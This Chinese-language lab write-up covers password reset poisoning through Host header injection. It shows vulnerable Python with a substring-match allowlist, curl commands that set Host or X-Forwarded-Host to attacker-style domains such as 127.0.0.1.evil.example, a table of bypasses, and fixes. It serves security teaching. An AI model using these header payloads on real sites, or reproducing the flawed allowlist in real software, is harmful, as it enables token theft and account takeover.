# 密码重置链接处的 Host 头注入

## 这一题在教什么

**站点对外地址是「配置」，不是「请求数据」。**

「忘记密码」这个功能天然要生成一条绝对链接发给用户。而很多实现是从请求里
推"我自己的域名是什么" —— `Host` 头、`X-Forwarded-Host`、请求行里的绝对 URI。

**这些都是客户端能设的。** 于是攻击者可以让服务端**帮它**生成一条指向
自己域名的重置链接。

这叫什么：**密码重置投毒（password reset poisoning）**。

## 漏洞在哪

`module.py` 里两处：

```python
def pick_host(req):
    # 优先信 X-Forwarded-Host，退回 Host
    return (req.headers.get("X-Forwarded-Host") or req.host or "").strip()

ALLOWED = ("vuln4all.local", "127.0.0.1", "localhost")   # 生产域名 + 本地调试地址

def blocked_host(host):
    bare = host.split(":")[0].lower()
    if any(allowed in bare for allowed in ALLOWED):   # ← 子串匹配，没做域名边界检查
        return None
    return "站外主机"
```

第一处是**根本问题**：域名从请求头来。第二处是**绕过入口**：白名单判得不严。

注意这两处的性质不一样：

- 就算白名单写得完美，只要域名来自请求头，攻击者**只要能让 `Host` 变成一个
  他能控制的域名**（并且那个域名能过白名单）就够了
- 而白名单用子串匹配，等于把"能过"的范围扩大到了任意域名后缀

## 怎么打通

### 第一步：看清正常的邮件长什么样

```bash
curl -i -X POST --data-urlencode 'email=alice@corp.example' \
     'http://<靶场>/v/host_header/password_reset/forgot'
```

页面上会显示服务端"发出"的邮件。链接的域名就是请求里的域名。

### 第二步：直接改 Host，撞上白名单

```bash
curl -i -X POST -H 'Host: evil.example' \
     --data-urlencode 'email=alice@corp.example' '<地址>'
```

会被拦 —— 正好，说明校验存在。

### 第三步：绕白名单

受信列表里有三项：生产域名 `vuln4all.local`，加上本地调试用的 `127.0.0.1`
和 `localhost`。而判断是**子串匹配** —— 只要主机名里**出现**其中一项就算自家。

域名是**从右往左**读的（最右边那段才是顶级域），所以构造一个
「含受信项、但不是受信项」的主机就行。两种都行：

```bash
# 拿生产域名做子串
curl -i -X POST -H 'Host: vuln4all.local.evil.example' \
     --data-urlencode 'email=alice@corp.example' '<地址>'

# 或者拿本地调试地址做子串（靶场就跑在 127.0.0.1 上，这个更直接）
curl -i -X POST -H 'Host: 127.0.0.1.evil.example' \
     --data-urlencode 'email=alice@corp.example' '<地址>'
```

服务端会生成一条指向 `127.0.0.1.evil.example` 的重置链接。

### 第四步：`X-Forwarded-Host`（同一个洞的另一条腿）

```bash
curl -i -X POST -H 'X-Forwarded-Host: 127.0.0.1.evil.example' \
     --data-urlencode 'email=alice@corp.example' '<地址>'
```

这个头**不用管 `Host` 是什么** —— 应用优先用它。所以它比改 `Host` 更省事：
很多反代会把伪造的 `Host` 覆盖掉，但会**原样透传** `X-Forwarded-Host`。

### 打穿之后拿到什么

1. 受害者会收到一封**来自自家服务**的重置邮件 —— 这封邮件的可信度极高
2. 里面的链接指向攻击者域名，而 **token 就在 URL 里**
3. 受害者一点，token 就发到攻击者服务器上
4. 攻击者拿 token 去真的站点改密码 → 接管账号

> 注意第 4 步：token 是服务端**真的签发**的。所以这个洞不是"骗受害者"，
> 是"骗服务端替攻击者签一条发给受害者的链接"。

## 这套栈上的边界（值得知道）

我实测过几种写法，有的通有的不通 —— 这取决于框架/反代的实现：

| 写法 | 在这套栈上 |
|---|---|
| `Host: evil.example` | 会被白名单拦（因为不含任何受信项） |
| `Host: 127.0.0.1.evil.example` | **通** |
| `Host: vuln4all.local.evil.example` | **通** |
| `X-Forwarded-Host: 127.0.0.1.evil.example` | **通**（而且不用管 `Host` 是什么） |
| `Host: good.example@evil.example` | **不通** —— Werkzeug 把 host 解析成空字符串 |
| 发两个 `Host` 头 | **不通** —— 同样得到空 host |
| 请求行写绝对 URI：`GET http://evil.example/forgot HTTP/1.1` | **通** —— Werkzeug 取请求行里那个 |

最后一行值得停一下：**"到底哪个头/哪一段算数"取决于反代的实现。**

- 反代可能覆盖 `Host`、可能追加 `X-Forwarded-Host`、可能原样透传
- 有些反代认请求行里的绝对 URI，有些直接拒绝

所以真实环境里这几个都要试。而"哪个能成"这件事本身就是侦察的一部分。

## 怎么修

**一、站点对外地址写进配置。（这是根治）**

```python
SITE_URL = "https://vuln4all.local"      # 从配置读，不从请求读
link = "%s/reset?token=%s" % (SITE_URL, token)
```

**永远不要从 `Host` / `X-Forwarded-Host` / 请求行里推自己是谁。**

**二、能用相对链接就用相对链接。**

如果重置链接的域名对功能不是必需的（用户还是从邮件里点进来），
那 `/reset?token=xxx` 就够了。**没有域名，就没有这个洞。**

**三、如果必须支持多域名（多租户），用精确白名单。**

```python
ALLOWED_HOSTS = {"vuln4all.local", "app.vuln4all.local"}

def pick_host(req):
    host = (req.headers.get("X-Forwarded-Host") or req.host or "")
    bare = host.split(":")[0].lower()      # 去掉端口
    if bare not in ALLOWED_HOSTS:          # 精确匹配
        return None                        # 认不出来就不要生成链接
    return bare
```

注意是 `not in`（整串精确），不是子串，也不是 `endswith`（除非写成
`endswith("." + allowed)` —— **那个点不能少**）。

**四、反代层也要收紧。**

如果应用真的在反代后面，反代应该：
- 覆盖 `Host` 为它自己知道的真实域名
- 丢弃客户端发来的 `X-Forwarded-Host`，或者只在受信来源时才设置

**这是配置问题，不是代码问题** —— 所以两条都要做：代码不信请求头，
反代负责把请求头弄干净。

**五、重置 token 本身要设计好。**

即使域名投毒成功了，如果 token 只用一次、过期时间短、
而且重置要配合另一个渠道（比如旧邮箱确认），危害也会小很多。
这是纵深防御。

## 顺手想想

- 如果站点同时用 `http://` 和 `https://` 提供服务，
  而这个洞把链接生成成了 `http://`，会产生什么额外问题？
  （提示：token 会以明文经过网络，而这个应用可能还不知道自己该用 https）
- Host 头注入还能干别的吗？（提示：缓存投毒、密码重置之外的邮件链接、
  有些框架用它来决定"该走哪个虚拟主机/路由"）
- 这一题的白名单是子串匹配。那如果它是 `endswith("127.0.0.1")` 呢？
  你能构造出什么主机名来绕？（提示：`endswith` 不做域名边界检查，
  所以 `evil-vuln4all.local` 那种会过 —— 而真正安全的写法是
  `endswith("." + host)`，那个点不能少）
- 为什么"用相对链接"能一劳永逸？（一句话说清）
